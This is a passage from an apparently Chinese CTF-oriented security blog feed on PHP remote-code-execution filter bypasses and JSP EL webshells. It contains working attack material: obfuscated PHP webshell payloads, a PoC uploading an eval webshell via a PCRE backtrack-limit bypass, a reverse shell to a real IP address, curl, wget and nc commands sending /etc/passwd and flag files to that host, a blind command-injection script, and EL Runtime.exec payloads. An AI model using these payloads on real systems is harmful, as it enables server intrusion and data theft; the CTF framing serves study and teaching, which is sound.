class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24____</span>.<span class="hljs-meta">%3D</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%24_</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24____</span>.<span class="hljs-meta">%3D</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%24_</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24____</span>.<span class="hljs-meta">%3D</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%24_</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24____</span>.<span class="hljs-meta">%3D</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24_</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%24</span><span class="hljs-meta">%24____</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24___</span>(<span class="hljs-meta">%24_</span><span class="hljs-meta">%5B_</span><span class="hljs-meta">%5D</span>)<span class="hljs-meta">%3B</span><br></code></pre></td></tr></table></figure><p>但是这种方式得到的payload过长，万一有长度限制就无法bypass；另外assert函数在php5中可以作为动态函数名来执行代码，类似于</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$a=<span class="hljs-string">&#x27;assert&#x27;</span><span class="hljs-comment">;</span><br>$b=<span class="hljs-string">&#x27;phpinfo();&#x27;</span><span class="hljs-comment">;</span><br>$a($b)<br></code></pre></td></tr></table></figure><p>但在php7中，assert不再作为函数使用，而是变成了语言结构(类似eval)，所以这种自增payload在php7也会失效。但我们依然可以采用上面提到的取反的方式进行函数动态调用。</p><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><p>不包含字母与数字的webshell</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>webshell<br>@<span class="hljs-variable">$_</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">2</span>b;<span class="hljs-variable">$__</span>=<span class="hljs-string">&#x27;#./&#124;&#123;&#x27;</span>^<span class="hljs-string">&#x27;&#124;~`//&#x27;</span>;<span class="hljs-variable">$&#123;$__&#125;</span>[!<span class="hljs-variable">$_</span>](<span class="hljs-variable">$&#123;$__&#125;</span>[<span class="hljs-variable">$_</span>]);<br><br><span class="hljs-regexp">//</span>post<br><span class="hljs-number">0</span>=assert&amp;<span class="hljs-number">1</span>=phpinfo();<br></code></pre></td></tr></table></figure><h3 id="8-linux内置变量"><a href="#8-linux内置变量" class="headerlink" title="8.linux内置变量"></a>8.linux内置变量</h3><p>使用环境内置变量我们可以获取需要的字符。</p><p>首先介绍几个linux内置变量</p><blockquote><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-keyword">$PATH</span>环境变量，可执行文件的搜索路径</span><br><br><span class="hljs-meta"><span class="hljs-keyword">$PWD</span>当前所在目录，比如在ctf环境中是/var/www/html</span><br><br><span class="hljs-symbol">$</span>&#123;#&lt;var&gt;&#125;计算变量var的长度<br><br><span class="hljs-meta"><span class="hljs-keyword">$RANDOM</span>产生0 - 32767之间的随机数</span><br><br>例如：echo <span class="hljs-symbol">$</span>\&#123;\#RANDOM\&#125; 表示随机整数的位数也就是<span class="hljs-number">1</span><span class="hljs-number">-5</span>之间任意一个数。<br><br><span class="hljs-meta"><span class="hljs-keyword">$SHLVL</span>记录多个 Bash 进程实例嵌套深度的累加器 其**默认初始值为1**</span><br><br><span class="hljs-meta"><span class="hljs-keyword">$USER</span>获取当前用户名例如：www-data</span><br><br><span class="hljs-meta"><span class="hljs-keyword">$PHP</span>_VERSION获取当前php版本例如：echo $\&#123;PHP_VERSION\&#125;</span><br><br><span class="hljs-meta"><span class="hljs-keyword">$HOME</span>用户的home目录，一般是/home/username</span><br><br><span class="hljs-meta"><span class="hljs-keyword">$HOSTNAME</span> 主机名称</span><br></code></pre></td></tr></table></figure></blockquote><p>然后是一些字符截取操作</p> <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>linux中可以用`~`获取变量的最后几位<br> <br> echo <span class="hljs-variable">$&#123;PWD:~0&#125;</span>  <span class="hljs-regexp">//</span>截取前目录的最后一个字符<br> <br><span class="hljs-regexp">//</span>同时可以用`::`获取变量的前几位<br> <br>echo <span class="hljs-variable">$&#123;PWD::0&#125;</span> <span class="hljs-regexp">//</span>截取当前目录的第一个字符也就是 /<br> <br><span class="hljs-regexp">//</span>用`<span class="hljs-variable">$&#123;#变量&#125;</span>`显示变量的长度<br> <br>echo <span class="hljs-variable">$&#123;#IFS&#125;</span>  <span class="hljs-regexp">//</span><span class="hljs-number">3</span><br>echo <span class="hljs-variable">$&#123;#&#125;</span><span class="hljs-regexp">//</span><span class="hljs-number">0</span><br>echo <span class="hljs-variable">$&#123;#?&#125;</span>  <span class="hljs-regexp">//</span><span class="hljs-number">1</span><br> <br>注意一个特殊情况:`<span class="hljs-variable">$&#123;#?&#125;</span>==<span class="hljs-number">1</span>`因此我们可以使用<span class="hljs-variable">$&#123;#?&#125;</span>来代替<span class="hljs-variable">$SHLVL</span>产生<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><blockquote><p><strong>$? 的奇妙用法：</strong></p><p>$?表示上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误</p><p>为什么有 &lt;A<code>&lt;A</code>返回的错误值 使得<code>$?</code>为1</p></blockquote><p>一些常用的payload:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-comment"># nl flag.php</span><br><span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">PATH</span><span class="hljs-symbol">:~A</span>&#125;<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">PWD</span><span class="hljs-symbol">:~A</span>&#125; <span class="hljs-string">??</span><span class="hljs-string">??</span>.<span class="hljs-string">??</span>?<br><br><span class="hljs-comment">#/bin/cat flag.php</span><br><span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">PWD</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-variable">$&#123;</span><span class="hljs-comment">#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;??$&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125; ????.??? </span><br><span class="hljs-comment">#或</span><br><span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">PWD</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-variable">$&#123;</span><span class="hljs-comment">#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???</span><br><br><span class="hljs-comment">#/bin/base64 flag.php  由于RANDOM所以需要多尝试几次</span><br>code=<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">PWD</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-variable">$&#123;</span><span class="hljs-comment">#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?????$&#123;#RANDOM&#125; ????.???</span><br><span class="hljs-comment">#或</span><br>code=&lt;A;<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">HOME</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-variable">$?</span>&#125;<span class="hljs-string">??</span><span class="hljs-string">?$</span>&#123;<span class="hljs-variable constant_">HOME</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-variable">$?</span>&#125;<span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">?$</span>&#123;<span class="hljs-variable constant_">RANDOM</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-variable">$?</span>&#125; <span class="hljs-string">??</span><span class="hljs-string">??</span>.<span class="hljs-string">??</span>?  <br><br></code></pre></td></tr></table></figure><h3 id="9-超过PRCE回溯限制绕正则"><a href="#9-超过PRCE回溯限制绕正则" class="headerlink" title="9.超过PRCE回溯限制绕正则"></a>9.超过PRCE回溯限制绕正则</h3><p>参考p牛文章<a href="https://www.freebuf.com/articles/web/190794.html">https://www.freebuf.com/articles/web/190794.html</a></p><p>写文件，但文件中不允许输入任何php代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_php</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;  <br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&lt;\?.*[(`;?&gt;].*/is&#x27;</span>, <span class="hljs-variable">$data</span>);  <br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_php</span>(<span class="hljs-variable">$input</span>)) &#123;<br>    <span class="hljs-comment">// fwrite($f, $input); ...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>利用正则表达式prce最大次数默认为1000000：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pcre</span>.backtrack_limit默认为<span class="hljs-number">1000000</span><br></code></pre></td></tr></table></figure><p>发送超过1000000字符大小的数据来使正则执行失败写入木马。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#poc</span><br>import requests<br><span class="hljs-keyword">from</span> io import BytesIO<br><br>files = &#123;<br>  <span class="hljs-string">&#x27;file&#x27;</span>: BytesIO(b<span class="hljs-string">&#x27;aaa&lt;?php eval($_POST[txt]);//&#x27;</span> + b<span class="hljs-string">&#x27;a&#x27;</span> * 1000000)<br>&#125;<br><br>res = requests.post(<span class="hljs-string">&#x27;http://IP/index.php&#x27;</span>, <span class="hljs-attribute">files</span>=files, <span class="hljs-attribute">allow_redirects</span>=<span class="hljs-literal">False</span>)<br><span class="hljs-built_in">print</span>(res.headers)<br></code></pre></td></tr></table></figure><h3 id="10-无回显命令执行"><a href="#10-无回显命令执行" class="headerlink" title="10.无回显命令执行"></a>10.无回显命令执行</h3><p>无回显命令执行可以考虑反弹shell或者数据外带。</p><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>不多说，直接弹就行</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sh</span> -i &gt;&amp; /dev/tcp/<span class="hljs-number">180.76.162.68</span>/<span class="hljs-number">8081</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h4 id="数据外带"><a href="#数据外带" class="headerlink" title="数据外带"></a>数据外带</h4><p><a href="https://blog.csdn.net/weixin_35910073/article/details/112458456">https://blog.csdn.net/weixin_35910073/article/details/112458456</a></p><h5 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>目标机执行<br>nc –l –p <span class="hljs-number">1234</span> &lt; <span class="hljs-regexp">/etc/</span>passwd   <span class="hljs-comment">#将/etc/passwd映射到1234端口</span><br><span class="hljs-regexp">//</span>本机执行<br>nc IP:<span class="hljs-number">1234</span>  <span class="hljs-comment">#监听目标机1234端口接收数据</span><br></code></pre></td></tr></table></figure><h5 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>目标机执行<br>curl http:<span class="hljs-regexp">//</span><span class="hljs-number">180.76</span>.<span class="hljs-number">162.68</span>:<span class="hljs-number">8888</span> -File=@/flag<br><span class="hljs-regexp">//</span>本机监听<br>nc -lvnp <span class="hljs-number">8888</span><br></code></pre></td></tr></table></figure><h5 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h5><p>由于wget可以指定headers，body等，因此我们将敏感数据放到请求包中里去外带数据</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>目标机执行<br>wget –header=<span class="hljs-string">&quot;EVIL:$(cat /flag)&quot;</span> http:<span class="hljs-regexp">//</span><span class="hljs-number">180.76</span>.<span class="hljs-number">162.68</span>:<span class="hljs-number">5555</span><br>wget –header=”evil:`cat <span class="hljs-regexp">/etc/</span>passwd &#124; xargs echo –n`” http:<span class="hljs-regexp">//</span><span class="hljs-number">180.76</span>.<span class="hljs-number">162.68</span>:<span class="hljs-number">5555</span> <span class="hljs-comment">#多行读取</span><br>wget –post-data exfil=`cat <span class="hljs-regexp">/etc/</span>passwd`&amp;b=<span class="hljs-number">1</span> http:<span class="hljs-regexp">//</span><span class="hljs-number">180.76</span>.<span class="hljs-number">162.68</span>:<span class="hljs-number">5555</span>  <span class="hljs-comment">#body传递</span><br>wget –post-file trophy.php http:<span class="hljs-regexp">//</span><span class="hljs-number">180.76</span>.<span class="hljs-number">162.68</span>:<span class="hljs-number">5555</span>  <span class="hljs-comment">#直接传递file</span><br><br><br><span class="hljs-regexp">//</span>本机监听<br>nc -lvnp <span class="hljs-number">5555</span><br></code></pre></td></tr></table></figure><h4 id="命令盲注"><a href="#命令盲注" class="headerlink" title="命令盲注"></a>命令盲注</h4><p>如果上述命令都不能用那么就考虑命令盲注，采用延时注入的方式。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>s=requests.session()<br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_!@#%&#124;^&amp;&#123;&#125;[]/-()+=,\\&#x27;</span>:<br>        starTime=time.time()<br>        url=<span class="hljs-string">&quot;http://127.0.0.1/?cmd=if [ `cut -c&quot;</span>+<span class="hljs-built_in">str</span>(z)+<span class="hljs-string">&quot;-&quot;</span>+<span class="hljs-built_in">str</span>(z)+<span class="hljs-string">&quot; /flag` != &#x27;&quot;</span>+i+<span class="hljs-string">&quot;&#x27; ]; then echo 1 ; else sleep 3; fi&quot;</span><br>        r=s.get(url)<br>        <span class="hljs-keyword">if</span>((time.time()-starTime)&gt;<span class="hljs-number">3</span>):<br>            flag+=i<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(z)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;the flag is&#x27;</span>+flag)<br></code></pre></td></tr></table></figure><h2 id="php安全特性bypass"><a href="#php安全特性bypass" class="headerlink" title="php安全特性bypass"></a>php安全特性bypass</h2><h3 id="bypass-open-basedir"><a href="#bypass-open-basedir" class="headerlink" title="bypass open_basedir"></a>bypass open_basedir</h3><p><a href="https://www.cnblogs.com/hookjoy/p/12846164.html">https://www.cnblogs.com/hookjoy/p/12846164.html</a></p><h3 id="bypass-disabled-function"><a href="#bypass-disabled-function" class="headerlink" title="bypass disabled_function"></a>bypass disabled_function</h3><p><a href="https://wiki.wgpsec.org/knowledge/ctf/bypass-disable-function.html">https://wiki.wgpsec.org/knowledge/ctf/bypass-disable-function.html</a></p><p><a href="https://www.anquanke.com/post/id/208451?from=timeline">https://www.anquanke.com/post/id/208451?from=timeline</a><br> &#96;&#96;&#96;</p>]]></content>
    
    
    
    <tags>
      
      <tag>php</tag>
      
      <tag>RCE bypass</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>新型EL webshell初探</title>
    <link href="/2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/"/>
    <url>/2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="从DesperateCat到EL-webshell初探"><a href="#从DesperateCat到EL-webshell初探" class="headerlink" title="从DesperateCat到EL webshell初探"></a>从DesperateCat到EL webshell初探</h1><h2 id="0x00-RWCTF引发的思考"><a href="#0x00-RWCTF引发的思考" class="headerlink" title="0x00 RWCTF引发的思考"></a>0x00 RWCTF引发的思考</h2><pre><code class="hljs">前段时间结束的Realworld ctf里有一道题目**DesperateCat**，这道题目考察的是严苛环境下写webshell的问题，对于写入文件内容的限制其中有一点：</code></pre><ul><li><p><strong>禁止传入圆括号、尖括号、引号等</strong>。</p><p>  如果我们单独处理bypass，那么其实很好解决：</p></li></ul><ol><li>尖括号 &lt;% %&gt;：使用EL表达式</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//&lt;%Runtime.getRuntime.exec(request.getParameter(&quot;cmd&quot;));%&gt;</span><br><span class="hljs-comment">//替换成为</span><br>$&#123;Runtime.getRuntime().exec(param.cmd)&#125;<br></code></pre></td></tr></table></figure><p>这样就避免出现了尖括号。</p><p>2.圆括号 () : java 代码编译解析器会识别 Unicode 形式的编码，所可以直接unicode</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//&lt;%Runtime.getRuntime().exec(&quot;calc&quot;);%&gt;</span><br>&lt;%\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u002e\u0067\u0065\u0074\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0028\u0029\u002e\u0065\u0078\u0065\u0063\u0028\u0022\u0063\u0061\u006c\u0063\u0022\u0029\u003b%&gt;<br></code></pre></td></tr></table></figure><p>但是要完全bypass，显然两者都是不行的，那么最终的方式是采用EL表达式中的 <strong>‘.’</strong> 与 <strong>‘&#x3D;’</strong>  。</p><ul><li><strong>EL中 . 点号属性取值相当于执行对象的 getter 方法，</strong>&#x3D; <strong>赋值则等同于执行 setter 方法。</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">$&#123;pageContext.servletContext.classLoader.resources.context.manager.pathname=param.a&#125;<br><span class="hljs-comment">//等同于</span><br>pageContext.getServletContext().getClassLoader().getResources().getContext().getManager().setPathname(request.getParameter(<span class="hljs-string">&quot;a&quot;</span>));<br></code></pre></td></tr></table></figure><p>通过这种方式我们可以获得ClassLoader修改一些tomcat的属性，最终达到利用session写shell的目的，当然到目前这道题目只是完成了一小部分，后面还涉及到如何使Tomcat reload 并实现持久化贮存session的问题等等，各位感兴趣的可以看一下长亭官方的wp。</p><pre><code class="hljs">**这道题目使用EL表达式进行bypass的方式引起了我的注意，通过精心构造EL表达式我们是否能实现更加精简且具有一定bypass能力的jsp webshell？**</code></pre><h2 id="0x01-简单尝试与回显问题"><a href="#0x01-简单尝试与回显问题" class="headerlink" title="0x01 简单尝试与回显问题"></a>0x01 简单尝试与回显问题</h2><p>我们使用开头提到的EL表达式来试一试：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">$&#123;Runtime<span class="hljs-selector-class">.getRuntime</span>()<span class="hljs-selector-class">.exec</span>(param.cmd)&#125;<br></code></pre></td></tr></table></figure><p><img src="/./2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/image-20220907140149065.png" 